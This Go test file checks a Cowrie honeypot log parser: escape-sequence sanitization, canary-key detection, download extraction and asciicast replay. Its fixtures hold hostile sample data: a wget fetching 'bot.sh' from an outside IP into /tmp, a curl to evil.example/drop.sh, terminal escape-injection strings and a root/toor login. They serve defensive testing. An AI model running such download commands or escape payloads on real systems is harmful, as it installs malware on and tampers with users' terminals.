package cowrieparser

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/harris/honeypot/internal/canary"
	honeypotv1 "github.com/harris/honeypot/proto/gen/honeypot/v1"
)

func TestSanitizeTerminalTextStripsEscapeAttacks(t *testing.T) {
	dirty := "\x1b]0;pwned-title\x07\x1bP1$r\x1b\\\x1b[31mcurl\x1b[0m http://evil.example/drop.sh\x00\x7f"
	clean := SanitizeTerminalText(dirty)
	if strings.Contains(clean, "\x1b") || strings.Contains(clean, "pwned-title") || strings.Contains(clean, "\x00") || strings.Contains(clean, "\x7f") {
		t.Fatalf("escape sequences survived sanitization: %q", clean)
	}
	if clean != "curl http://evil.example/drop.sh" {
		t.Fatalf("unexpected sanitized output: %q", clean)
	}
}

func TestCowrieParserSessionReplayAndDownloadExtraction(t *testing.T) {
	pool := canary.NewSensorKeyPool()
	pool.AddSeeds([]*honeypotv1.CanaryKeySeed{
		{
			CanaryKeyId:     "can-1",
			KeyPlaintext:    "sk-proj-canarysecret1234567890",
			ProviderStyle:   "openai",
			PlacementSource: "cowrie_honeyfs",
		},
	})
	p := NewParser("node-1", 22, pool)

	lines := []string{
		`{"eventid":"cowrie.session.connect","timestamp":"2026-11-16T10:00:00Z","session":"sess-a1","src_ip":"198.51.100.10","src_port":55123,"dst_port":22,"protocol":"ssh"}`,
		`{"eventid":"cowrie.client.version","timestamp":"2026-11-16T10:00:00.1Z","session":"sess-a1","version":"SSH-2.0-Go"}`,
		`{"eventid":"cowrie.client.kex","timestamp":"2026-11-16T10:00:00.2Z","session":"sess-a1","hassh":"b12d2871a1189eff20364cf5333619ee"}`,
		`{"eventid":"cowrie.login.success","timestamp":"2026-11-16T10:00:01Z","session":"sess-a1","src_ip":"198.51.100.10","username":"root","password":"toor"}`,
		`{"eventid":"cowrie.command.input","timestamp":"2026-11-16T10:00:02Z","session":"sess-a1","src_ip":"198.51.100.10","input":"\u001b]2;evil\u0007wget http://203.0.113.55/bot.sh -O /tmp/b && echo sk-proj-canarysecret1234567890"}`,
		`{"eventid":"cowrie.session.file_download","timestamp":"2026-11-16T10:00:03Z","session":"sess-a1","src_ip":"198.51.100.10","url":"http://203.0.113.55/bot.sh","outfile":"/var/lib/cowrie/downloads/abc","shasum":"` + strings.Repeat("a", 64) + `"}`,
		`{"eventid":"cowrie.session.closed","timestamp":"2026-11-16T10:00:05Z","session":"sess-a1","duration":5.0}`,
	}

	var downloads []FileDownloadNotice
	var replay *honeypotv1.SshSessionReplay
	var sawCanary bool
	for _, ln := range lines {
		res, err := p.ProcessLine(ln)
		if err != nil {
			t.Fatalf("ProcessLine failed: %v", err)
		}
		downloads = append(downloads, res.Downloads...)
		for _, ev := range res.Events {
			if ev.GetCanaryKeyId() == "can-1" {
				sawCanary = true
			}
		}
		if res.Replay != nil {
			replay = res.Replay
		}
	}

	if !sawCanary {
		t.Fatal("expected canary key match in command telemetry")
	}
	if len(downloads) < 2 {
		t.Fatalf("expected >= 2 download notices (command URL + file_download), got %d", len(downloads))
	}
	if replay == nil {
		t.Fatal("expected SshSessionReplay on cowrie.session.closed")
	}
	if replay.Hassh != "b12d2871a1189eff20364cf5333619ee" || replay.Username != "root" || !replay.AuthSucceeded {
		t.Fatalf("unexpected replay fields: %+v", replay)
	}
	if strings.Contains(replay.AsciicastV2, "evil") && strings.Contains(replay.AsciicastV2, "\x1b]") {
		t.Fatalf("asciicast contains unsanitized OSC sequence: %q", replay.AsciicastV2)
	}

	castLines := strings.Split(strings.TrimSpace(replay.AsciicastV2), "\n")
	if len(castLines) < 2 {
		t.Fatalf("expected asciicast header + event rows, got %d lines", len(castLines))
	}
	var hdr map[string]any
	if err := json.Unmarshal([]byte(castLines[0]), &hdr); err != nil {
		t.Fatalf("invalid asciicast v2 header JSON: %v", err)
	}
	if int(hdr["version"].(float64)) != 2 {
		t.Fatalf("expected asciicast version 2, got %v", hdr["version"])
	}
	if p.ActiveSessions() != 0 {
		t.Fatalf("expected closed session evicted, active=%d", p.ActiveSessions())
	}
}
